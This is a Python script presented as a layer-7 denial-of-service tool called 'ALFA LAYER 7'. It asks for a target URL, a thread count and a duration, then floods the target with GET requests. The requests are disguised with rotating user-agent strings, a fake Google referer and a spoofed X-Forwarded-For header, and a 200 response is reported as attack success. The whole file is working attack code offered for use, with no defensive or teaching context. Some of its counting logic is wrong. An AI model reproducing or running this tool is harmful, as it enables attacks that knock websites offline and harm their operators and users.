import random
import time
import requests
from rich.console import Console
import pyfiglet
import re
from concurrent.futures import ThreadPoolExecutor

# Function to validate URL
def is_valid_url(url: str) -> bool:
    regex = re.compile(
        r'^(?:http|ftp)s?://' 
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' 
        r'localhost|' 
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' 
        r'?[A-F0-9]*:[A-F0-9:]+?)' 
        r'(?::\d+)?' 
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Function to analyze response status
def analyze_status_code(status_code: int) -> str:
    if status_code == 200:
        return "[green]200 OK - Attack Success[/green]"
    elif status_code == 503:
        return "[red]503 Service Unavailable - Server Problem[/red]"
    elif status_code == 404:
        return "[red]404 Not Found - Resource Missing[/red]"
    elif status_code == 403:
        return "[red]403 Forbidden - Access Denied[/red]"
    elif status_code == 500:
        return "[red]500 Internal Server Error - Server Problem[/red]"
    else:
        return f"[red]{status_code} Error - Server Problem[/red]"

# Function to simulate delay between requests
def simulate_delay():
    delay = random.uniform(0.1, 0.5)  # Random delay between 0.1 to 0.5 seconds
    time.sleep(delay)

# User Agents List
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
]

# Headers to make the request appear normal
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': random.choice(user_agents),
    'Referer': 'https://www.google.com',
    'X-Forwarded-For': '192.168.1.1',
    'Origin': 'https://www.example.com',
}

console = Console()

# Banner for the tool
banner = pyfiglet.figlet_format("ALFA LAYER 7")
console.print(f"[bold red]{banner}[/bold red]")

# List of available attack methods
attack_methods = ["HTTP"]

# Display attack methods
console.print("[red]├─── DOS TOOL[/red]")
console.print("[red]├─── AVAILABLE METHODS[/red]")
console.print(f"[red]├─── LAYER 7: {' | '.join(attack_methods)}[/red]")
console.print("[red]├───┐[/red]")

# Get user input and validate METHOD
while True:
    method = console.input("[red]│   ├───METHOD: [/red]")
    if method not in attack_methods:
        console.print("[bold red]Error: Invalid METHOD! Please choose a valid method.[/bold red]")
    else:
        break

# Get user input for TIME
while True:
    time_duration = console.input("[red]│   ├───TIME: [/red]")
    if not time_duration.isdigit():
        console.print("[bold red]Error: TIME must be a number![/bold red]")
    else:
        break

# Get user input for THREADS
while True:
    threads = console.input("[red]│   ├───THREADS: [/red]")
    if not threads.isdigit():
        console.print("[bold red]Error: THREADS must be a number![/bold red]")
    else:
        break

# Get user input for URL and validate it
while True:
    url = console.input("[red]│   └───URL: [/red]")
    if not is_valid_url(url):
        console.print("[bold red]Error: Invalid URL! Please enter a valid URL.[/bold red]")
    else:
        break

# Function to send GET requests and analyze server status
def send_get_request(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        status = response.status_code
        result = analyze_status_code(status)
        console.print(f"[blue]{result}[/blue]")
        if status == 503 or status == 500:
            console.print(f"[red]Server might be down, received status {status}[/red]")
    except requests.exceptions.RequestException as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# Function to simulate attack with multiple threads using ThreadPoolExecutor
def start_attack(url, threads, time_duration):
    start_time = time.time()  # Start the timer for attack duration
    console.print("[bold green]Attack Started Successfully![/bold green]")
    with ThreadPoolExecutor(max_workers=int(threads)) as executor:
        for _ in range(int(time_duration)):
            executor.submit(send_get_request, url)
            simulate_delay()  # Simulate delay between requests

    end_time = time.time()  # End the timer
    elapsed_time = end_time - start_time
    console.print(f"[yellow]Total Time Taken: {elapsed_time:.2f} seconds[/yellow]")
    total_requests = int(threads) * int(time_duration)
    console.print(f"[yellow]Total Requests Sent: {total_requests}[/yellow]")
    console.print(f"[green]Attack completed for {url}[/green]")

# Final Output
console.print("\n[red]Executing Attack...[/red]\n")
console.print(f"[red]METHOD: {method}[/red]")
console.print(f"[red]TIME: {time_duration}[/red]")
console.print(f"[red]THREADS: {threads}[/red]")
console.print(f"[red]URL: {url}[/red]")

start_attack(url, threads, int(time_duration))
